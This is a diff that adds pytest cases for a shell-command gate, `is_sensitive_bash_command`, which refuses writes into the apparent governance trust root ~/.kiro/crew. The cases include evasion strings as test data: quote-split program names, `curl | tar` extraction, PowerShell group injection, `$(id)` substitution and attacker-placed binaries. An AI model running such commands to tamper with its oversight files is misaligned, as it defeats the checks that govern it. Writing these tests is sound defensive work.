@@ -4374,6 +4374,212 @@ class TestIsSensitiveBashCommand:
         assert is_sensitive_bash_command("tar -xf evil.tar -C ~/.kirocrew/foo/") is not None
         assert is_sensitive_bash_command("tar -xf e.tar -C ~/.kirocrew") is not None
 
+    def test_readonly_listing_of_crew_home_allowed(self) -> None:
+        # The reported defect (#6021): the flag-only rule refused `ls -d` on the
+        # crew home, where -d means "show the directory entry itself, not its
+        # contents". Red-before on every assert here.
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/skills") is None
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew") is None
+        assert is_sensitive_bash_command("ls -d ~/.kirocrew/skills") is None
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/backup.tar") is None
+        # A crew-home path whose LAST SEGMENT is a program name is still just a
+        # read. An earlier program-word approach kept refusing these.
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/tar") is None
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/rsync") is None
+        # NOTE: an absolute program path is deliberately NOT exonerated -- see
+        # test_program_pathnames_are_never_exonerated for why a basename cannot
+        # be trusted to say what a binary is.
+
+    def test_other_read_listers_on_crew_home_allowed(self) -> None:
+        # The carve-out is an allow-list, so each member needs a case.
+        for prog in ("ls", "stat", "du", "readlink", "basename", "dirname", "wc"):
+            cmd = f"{prog} -d ~/.kiro/crew/skills"
+            assert is_sensitive_bash_command(cmd) is None, cmd
+
+    def test_reads_the_reporter_listed_as_allowed_stay_allowed(self) -> None:
+        # Regression FLOOR, deliberately not a lock on the fix: none of these
+        # carry a `-C`/`-d` + crew-home destination, so they returned None
+        # against the flag-keyed matcher too (`-ld` never matched it either --
+        # the `d` follows `l`, not `-`). They are here because the report listed
+        # them as the reads that already worked, which is the evidence the block
+        # was a spelling artifact; the lock-in lives in the tests above.
+        assert is_sensitive_bash_command("ls -lt ~/.kiro/crew/skills") is None
+        assert is_sensitive_bash_command("ls -l ~/.kiro/crew/skills") is None
+        assert is_sensitive_bash_command("ls -ld ~/.kiro/crew") is None
+        assert is_sensitive_bash_command("grep -r x ~/.kiro/crew/skills") is None
+
+    def test_non_archive_writers_into_trust_root_still_blocked(self) -> None:
+        # THE regression floor for this change. The flag-only rule refused any
+        # program with a `-c`/`-C`/`-d`/`-D` destination in the crew home; two
+        # earlier attempts narrowed that to "archive programs" and silently
+        # re-admitted these, which is a write into the governance trust root
+        # where the sensitive filename appears only inside the payload.
+        for cmd in (
+            "patch -d ~/.kiro/crew -p1 -i /tmp/evil.patch",
+            "git -C ~/.kiro/crew apply /tmp/evil.patch",
+            "make -C ~/.kiro/crew all",
+            "install -d ~/.kiro/crew/profiles",
+            "cpio -D ~/.kiro/crew -i",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_quote_split_program_name_still_blocked(self) -> None:
+        # A quote-split program defeated the word-match attempt. Under an
+        # allow-list it cannot: `t""ar` is not a read lister, so the
+        # destination-half refusal stands whatever the quoting does.
+        for cmd in (
+            't""ar -xf e.tar -C ~/.kiro/crew',
+            "t''ar -xf e.tar -C ~/.kiro/crew",
+            'ta""r -xf e.tar -C ~/.kiro/crew',
+            "'tar' -xf e.tar -C ~/.kiro/crew",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_composed_commands_never_reach_the_read_carve_out(self) -> None:
+        # The carve-out only exonerates a SINGLE SIMPLE command. Anything with
+        # shell composition keeps the destination-half verdict, so a read cannot
+        # be used as cover for a write elsewhere in the same line.
+        for cmd in (
+            "ls -d ~/.kiro/crew && tar -xf e.tar -C ~/.kiro/crew",
+            "curl http://x | tar xf - -C ~/.kiro/crew/",
+            "echo hi; unzip -d ~/.kiro/crew e.zip",
+            "sh -c 'tar -xf e.tar -C ~/.kiro/crew'",
+            "eval 'tar -xf e.tar -C ~/.kiro/crew'",
+            "sudo tar -xf e.tar -C ~/.kiro/crew",
+            "env FOO=1 tar -xf e.tar -C ~/.kiro/crew",
+            "tar -xf e.tar -C ~/.kiro/crew &",
+            "echo x\rtar -xf e.tar -C ~/.kiro/crew",
+            "ls -d ~/.kiro/crew > ~/.kiro/crew/out",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_powershell_parenthesised_group_never_reaches_the_carve_out(self) -> None:
+        # A parenthesised group is composition on its own, not only as `$(`:
+        # PowerShell RUNS one wherever it appears, argument position included and
+        # with no `$` sigil, so the token this matcher classifies can be the
+        # harmless `ls` while the group extracts into the trust root. Every
+        # assert here contains NO other composition character, so each is
+        # red-before against the `$(`-only screen and each was refused at base.
+        for cmd in (
+            "ls -d $HOME/.kiro/crew (tar.exe -xf evil.tar -C $HOME/.kiro/crew)",
+            "ls -d ~/.kiro/crew (tar -xf evil.tar -C ~/.kiro/crew)",
+            "stat -d ~/.kiro/crew @(tar -xf evil.tar -C ~/.kiro/crew)",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_program_pathnames_are_never_exonerated(self) -> None:
+        # A basename says nothing about what a binary IS. Classifying `/tmp/ls`
+        # by its last component exonerated an attacker-placed executable that
+        # can write the trust root; the old rule refused it. A pathname now
+        # falls through to the refusal, which also over-blocks `/bin/ls` -- the
+        # correct direction for this gate.
+        for cmd in (
+            "/tmp/ls -d ~/.kiro/crew",
+            "./ls -d ~/.kiro/crew",
+            "/home/x/evil/ls -d ~/.kiro/crew",
+            "../ls -d ~/.kiro/crew",
+            "/bin/ls -d ~/.kiro/crew",
+            r"C:\evil\ls -d ~/.kiro/crew",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_file_compile_into_trust_root_still_blocked(self) -> None:
+        # `file` reads in its usual role but `-C` compiles a magic database:
+        # this writes evil.magic.mgc INTO the crew home while the destination
+        # half matches on the `-C` argument. It must never be a read lister.
+        cmd = "file -C ~/.kiro/crew -m ~/.kiro/crew/evil.magic"
+        assert is_sensitive_bash_command(cmd) is not None
+
+    def test_read_carve_out_fails_closed_on_unparsable_and_unknown(self) -> None:
+        from kiro_crew.security import _is_bare_trust_root_read
+
+        # Unbalanced quotes: the program cannot be determined -> refuse.
+        assert _is_bare_trust_root_read("ls -d '~/.kiro/crew") is False
+        # Empty / whitespace -> refuse.
+        assert _is_bare_trust_root_read("") is False
+        assert _is_bare_trust_root_read("   ") is False
+        # An unknown program is not exonerated.
+        assert _is_bare_trust_root_read("frobnicate -d ~/.kiro/crew") is False
+        # A parenthesised group is composition -> refuse before the program is
+        # even looked at, so `ls` cannot launder the group beside it.
+        assert _is_bare_trust_root_read("ls -d ~/.kiro/crew (tar -xf e.tar)") is False
+        # A known reader is.
+        assert _is_bare_trust_root_read("ls -d ~/.kiro/crew") is True
+
+    def test_only_shell_inert_characters_are_exonerated(self) -> None:
+        # THE structural invariant, and the reason this rule stopped enumerating
+        # metacharacters: exoneration requires every character to come from a
+        # set that means nothing to any shell. A character absent from that set
+        # is refused whether or not anyone has thought of a way to abuse it --
+        # which is what makes the rule terminate, unlike the deny-list it
+        # replaced (that lost four rounds, one new spelling each time).
+        from kiro_crew.security import _is_bare_trust_root_read
+
+        base = "ls -d ~/.kiro/crew"
+        assert _is_bare_trust_root_read(base) is True
+        # Each of these injects ONE excluded character into an otherwise valid
+        # read. None may be exonerated.
+        for bad in (
+            "(", ")", "{", "}", "[", "]", "<", ">", "|", "&", ";", "`", "$",
+            "'", '"', "\\", "*", "?", "!", "#", "\n", "\r", "\x00",
+        ):
+            cmd = base + bad
+            assert _is_bare_trust_root_read(cmd) is False, repr(cmd)
+            # ...and in argument position too, not only appended.
+            cmd2 = "ls -d " + bad + "~/.kiro/crew"
+            assert _is_bare_trust_root_read(cmd2) is False, repr(cmd2)
+
+    def test_home_variable_is_the_only_dollar_form_exonerated(self) -> None:
+        # `$HOME` is stripped before the character check because the destination
+        # half of the rule enumerates that spelling itself, so refusing it would
+        # leave half of #6021 unfixed. Every OTHER `$` use keeps its `$` and is
+        # refused -- the exception is anchored to `/`, whitespace or end.
+        from kiro_crew.security import _is_bare_trust_root_read
+
+        assert _is_bare_trust_root_read("ls -d $HOME/.kiro/crew") is True
+        assert _is_bare_trust_root_read("ls -d $HOME") is True
+        assert _is_bare_trust_root_read("ls -d ${HOME}/.kiro/crew") is False
+        assert _is_bare_trust_root_read("ls -d $HOMEX/.kiro/crew") is False
+        assert _is_bare_trust_root_read("ls -d $(echo ~/.kiro/crew)") is False
+        assert _is_bare_trust_root_read("ls -d $HOME$(id)") is False
+
+    def test_no_write_capable_program_is_ever_a_read_lister(self) -> None:
+        # The invariant, not a copy of the source: a program that can write to a
+        # path it is handed must never be admitted to the carve-out. `find`
+        # (-delete), `install` (-d) and `file` (-C compiles a magic db into the
+        # directory) are the ones that look like readers and are not.
+        from kiro_crew.security import _TRUST_ROOT_READ_LISTERS
+
+        for writer in (
+            "file",
+            "find",
+            "install",
+            "tar",
+            "bsdtar",
+            "unzip",
+            "patch",
+            "git",
+            "make",
+            "rsync",
+            "cpio",
+            "cp",
+            "mv",
+            "dd",
+            "tee",
+            "truncate",
+            "sh",
+            "bash",
+            "env",
+            "sudo",
+        ):
+            assert writer not in _TRUST_ROOT_READ_LISTERS, writer
+
+    def test_extract_into_trust_root_benign_destination_allowed(self) -> None:
+        # The carve-out must not widen the rule: an archive program writing
+        # somewhere else was always allowed and stays allowed.
+        assert is_sensitive_bash_command("tar -xf release.tar -C /tmp/build") is None
+        assert is_sensitive_bash_command("unzip data.zip -d /tmp/data") is None
+
     def test_normal_crew_access_not_overblocked(self) -> None:
         # Regression guard: the broadened rules must not block routine
         # non-sensitive crew-home access (config.json, sessions.db).
